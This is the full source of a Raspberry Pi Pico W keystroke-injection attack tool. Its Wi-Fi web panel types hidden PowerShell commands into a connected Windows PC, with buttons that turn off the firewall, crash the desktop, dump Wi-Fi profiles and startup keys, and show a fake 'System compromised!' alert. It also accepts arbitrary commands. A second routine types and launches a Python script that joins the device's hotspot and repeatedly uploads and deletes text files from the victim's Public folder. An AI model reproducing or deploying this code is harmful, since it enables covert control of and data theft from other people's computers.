#include "Keyboard.h"
#include "pico/cyw43_arch.h"
#include "pico/stdlib.h"
#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <SD.h>

const char* ssid = "Pico_Hotspot";
const char* password = "12345678";

WebServer server(80);
#define SD_CS_PIN 17
String status = "Idle";
int fileCounter = 0;

void setup() {
    Serial.begin(115200);
    Keyboard.begin();
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);

    // Initialize SD Card
    SPI.setSCK(18);
    SPI.setTX(19);
    SPI.setRX(16);
    if (!SD.begin(SD_CS_PIN)) {
        Serial.println("SD Card initialization failed!");
        status = "SD Card Error";
        return;
    }
    Serial.println("SD Card initialized");

    // Setup WiFi Hotspot
    WiFi.softAP(ssid, password);
    IPAddress IP = WiFi.softAPIP();
    Serial.print("Hotspot IP: ");
    Serial.println(IP);

    // Web server routes
    server.on("/", handleRoot);
    server.on("/execute", handleShellCommand);
    server.on("/upload", HTTP_POST, handleUpload);
    server.on("/listfiles", handleListFiles);
    server.on("/inject", handleInjectScript);  // Route for button-triggered injection
    server.begin();
    Serial.println("Web server started");
}

void loop() {
    server.handleClient();
    digitalWrite(LED_BUILTIN, status == "Idle" ? LOW : HIGH);
}

void handleRoot() {
    digitalWrite(LED_BUILTIN, HIGH);
    String html = "<!DOCTYPE html><html><head><title>Pico W Command Center</title>";
    html += "<style>";
    html += "body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #e0e0e0; margin: 0; padding: 20px; }";
    html += "h2 { color: #00d4ff; text-align: center; text-shadow: 0 0 10px #00d4ff; }";
    html += ".container { max-width: 700px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.5); }";
    html += "p { font-size: 18px; margin: 10px 0; }";
    html += "#status { color: #00ff9d; font-weight: bold; transition: color 0.3s; }";
    html += "input[type='text'] { width: 70%; padding: 10px; font-size: 16px; border: 2px solid #00d4ff; border-radius: 5px; background: #0f1626; color: #fff; }";
    html += "button { padding: 10px 15px; font-size: 14px; background: #00d4ff; border: none; border-radius: 5px; color: #1a1a2e; cursor: pointer; transition: background 0.3s, transform 0.2s; margin: 5px; }";
    html += "button:hover { background: #00ff9d; transform: scale(1.05); }";
    html += "button:active { transform: scale(0.95); }";
    html += ".button-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 15px; }";
    html += ".footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }";
    html += "#fileList { margin-top: 20px; padding: 10px; background: #0f1626; border-radius: 5px; }";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<h2>Pico W Command Center</h2>";
    html += "<p>Status: <span id='status'>" + status + "</span></p>";
    html += "<input type='text' id='cmd' placeholder='Enter your command...'>";
    html += "<button onclick='executeCmd()'>Execute</button>";
    html += "<div class='button-row'>";
    html += "<button onclick=\"fetch('/execute?cmd=shutdown /r /t 0')\">Restart Now</button>";
    html += "<button onclick=\"fetch('/execute?cmd=rundll32.exe user32.dll,LockWorkStation')\">Lock Screen</button>";
    html += "<button onclick=\"fetch('/execute?cmd=Get-Process | Out-File C:\\\\Users\\\\Public\\\\processes.txt')\">List Processes</button>";
    html += "<button onclick=\"fetch('/execute?cmd=Get-ItemProperty -Path HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run > C:\\\\Users\\\\Public\\\\startup.txt')\">Dump Startup</button>";
    html += "<button onclick=\"fetch('/execute?cmd=netsh wlan show profiles > C:\\\\Users\\\\Public\\\\wifi.txt')\">WiFi Profiles</button>";
    html += "<button onclick=\"fetch('/execute?cmd=Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\\'System compromised!\\', \\'Alert\\')')\">Fake Alert</button>";
    html += "<button onclick=\"fetch('/execute?cmd=Stop-Process -Name explorer -Force')\">Crash Desktop</button>";
    html += "<button onclick=\"fetch('/execute?cmd=New-Item -Path C:\\\\hidden -ItemType Directory; attrib +h C:\\\\Users\\\\Public\\\\hidden')\">Hide Folder</button>";
    html += "<button onclick=\"fetch('/execute?cmd=netsh advfirewall set allprofiles state off')\">Kill Firewall</button>";
    html += "<button onclick=\"fetch('/execute?cmd=Get-EventLog -LogName System -Newest 50 > C:\\\\Users\\\\Public\\\\startup.txt')\">Log Events</button>";
    html += "<button onclick=\"fetch('/inject')\">Start File Transfer</button>";  // Updated button name
    html += "<button onclick=\"listFiles()\">List Files</button>";
    html += "</div>";
    html += "<div id='fileList'></div>";
    html += "<div class='footer'>Powered by Pico W</div>";
    html += "</div>";
    html += "<script>";
    html += "function executeCmd() {";
    html += "  let cmd = document.getElementById('cmd').value;";
    html += "  fetch('/execute?cmd=' + encodeURIComponent(cmd)).then(() => {";
    html += "    document.getElementById('status').style.color = '#ff007a';";
    html += "    setTimeout(() => { document.getElementById('status').style.color = '#00ff9d'; }, 500);";
    html += "  });";
    html += "  document.getElementById('cmd').value = '';";
    html += "}";
    html += "function listFiles() {";
    html += "  fetch('/listfiles').then(response => response.text()).then(data => {";
    html += "    document.getElementById('fileList').innerHTML = '<h3>SD Card Files:</h3>' + data;";
    html += "  });";
    html += "}";
    html += "</script></body></html>";

    server.send(200, "text/html", html);
    digitalWrite(LED_BUILTIN, LOW);
}

void handleShellCommand() {
    digitalWrite(LED_BUILTIN, HIGH);
    if (server.hasArg("cmd")) {
        String command = server.arg("cmd");
        executeCommand(command);
        server.send(200, "text/plain", "Executed: " + command);
    } else {
        server.send(400, "text/plain", "Missing command");
    }
    digitalWrite(LED_BUILTIN, LOW);
}

void handleUpload() {
    digitalWrite(LED_BUILTIN, HIGH);
    Serial.println("Received upload request");
    if (server.method() == HTTP_POST) {
        String data = server.arg("plain");
        Serial.println("Data received: " + data.substring(0, 50));  // Log first 50 chars
        if (data.length() > 0) {
            String filename = "cmd_" + String(fileCounter++) + ".txt";
            File file = SD.open(filename, FILE_WRITE);
            if (file) {
                file.print(data);
                file.close();
                status = "File saved: " + filename;
                Serial.println(status);
                server.send(200, "text/plain", status);
            } else {
                status = "SD Write Error";
                Serial.println(status);
                server.send(500, "text/plain", status);
            }
        } else {
            status = "No data received";
            Serial.println(status);
            server.send(400, "text/plain", status);
        }
    } else {
        status = "Invalid request method";
        Serial.println(status);
        server.send(400, "text/plain", status);
    }
    digitalWrite(LED_BUILTIN, LOW);
}

void handleListFiles() {
    digitalWrite(LED_BUILTIN, HIGH);
    String fileList = "<ul>";
    File root = SD.open("/");
    if (root) {
        while (true) {
            File entry = root.openNextFile();
            if (!entry) break;
            fileList += "<li>" + String(entry.name()) + " (" + String(entry.size()) + " bytes)</li>";
            entry.close();
        }
        root.close();
    } else {
        fileList += "<li>Error opening SD card</li>";
    }
    fileList += "</ul>";
    server.send(200, "text/html", fileList);
    digitalWrite(LED_BUILTIN, LOW);
}

void executeCommand(String command) {
    status = "Executing command: " + command;
    digitalWrite(LED_BUILTIN, HIGH);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("powershell -WindowStyle Hidden -Command \"" + command + "\"");
    Keyboard.write(KEY_RETURN);
    delay(1000);
    digitalWrite(LED_BUILTIN, LOW);
    status = "Idle";
}

void handleInjectScript() {
    digitalWrite(LED_BUILTIN, HIGH);
    status = "Starting file transfer script...";
    injectPCScript();
    server.send(200, "text/plain", "File transfer script started");
    status = "Idle";
    digitalWrite(LED_BUILTIN, LOW);
}

void injectPCScript() {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(300);
    Keyboard.print("notepad C:\\Users\\Public\\pico_transfer.py");
    Keyboard.write(KEY_RETURN);
    delay(800);
    Keyboard.write(KEY_RETURN);
    delay(1000);

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('a');  // Select all (Ctrl + A)
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_DELETE);  // Delete selected content
    delay(1000);

    String script = "";
    script += "import os\n";
    script += "import time\n";
    script += "import requests\n";
    script += "import pywifi\n";
    script += "from pywifi import const\n";
    script += "\n";
    script += "SSID = \"Pico_Hotspot\"\n";
    script += "PASSWORD = \"12345678\"\n";
    script += "PICO_IP = \"192.168.42.1\"\n";
    script += "\n";
    script += "def connect_to_wifi():\n";
    script += "    wifi = pywifi.PyWiFi()\n";
    script += "    iface = wifi.interfaces()[0]\n";
    script += "    if iface.status() in [const.IFACE_CONNECTED, const.IFACE_CONNECTING]:\n";
    script += "        iface.disconnect()\n";
    script += "        time.sleep(2)\n";
    script += "    iface.scan()\n";
    script += "    time.sleep(2)\n";
    script += "    networks = iface.scan_results()\n";
    script += "    for network in networks:\n";
    script += "        if network.ssid == SSID:\n";
    script += "            profile = pywifi.Profile()\n";
    script += "            profile.ssid = SSID\n";
    script += "            profile.auth = const.AUTH_ALG_OPEN\n";
    script += "            profile.akm.append(const.AKM_TYPE_WPA2PSK)\n";
    script += "            profile.cipher = const.CIPHER_TYPE_CCMP\n";
    script += "            profile.key = PASSWORD\n";
    script += "            iface.remove_all_network_profiles()\n";
    script += "            tmp_profile = iface.add_network_profile(profile)\n";
    script += "            iface.connect(tmp_profile)\n";
    script += "            time.sleep(5)\n";
    script += "            return iface.status() == const.IFACE_CONNECTED\n";
    script += "    return False\n";
    script += "\n";
    script += "def upload_file(file_path):\n";
    script += "    try:\n";
    script += "        try:\n";
    script += "            with open(file_path, 'r', encoding='utf-8') as f:\n";
    script += "                content = f.read()\n";
    script += "        except UnicodeDecodeError:\n";
    script += "            with open(file_path, 'r', encoding='utf-16le') as f:\n";
    script += "                content = f.read()\n";
    script += "        response = requests.post(f\"http://{PICO_IP}/upload\", data=content, headers={'Content-Type': 'text/plain'})\n";
    script += "        print(f\"Uploaded {file_path}: {response.text}\")\n";
    script += "        os.remove(file_path)  # Delete the file after successful upload\n";
    script += "        print(f\"Deleted {file_path}\")\n";
    script += "    except Exception as e:\n";
    script += "        print(f\"Error uploading {file_path}: {e}\")\n";
    script += "\n";
    script += "if connect_to_wifi():\n";
    script += "    print(\"Connected to Pico_Hotspot\")\n";
    script += "    output_dir = \"C:\\\\Users\\\\Public\"\n";
    script += "    while True:\n";
    script += "        for filename in os.listdir(output_dir):\n";
    script += "            if filename.endswith('.txt'):\n";
    script += "                file_path = os.path.join(output_dir, filename)\n";
    script += "                upload_file(file_path)\n";
    script += "        time.sleep(1)\n";
    script += "else:\n";
    script += "    print(\"Failed to connect to Pico_Hotspot\")\n";

    delay(800);
    Keyboard.print(script);
    delay(500);

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('s');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("cmd /c python C:\\Users\\Public\\pico_transfer.py");
    Keyboard.write(KEY_RETURN);
}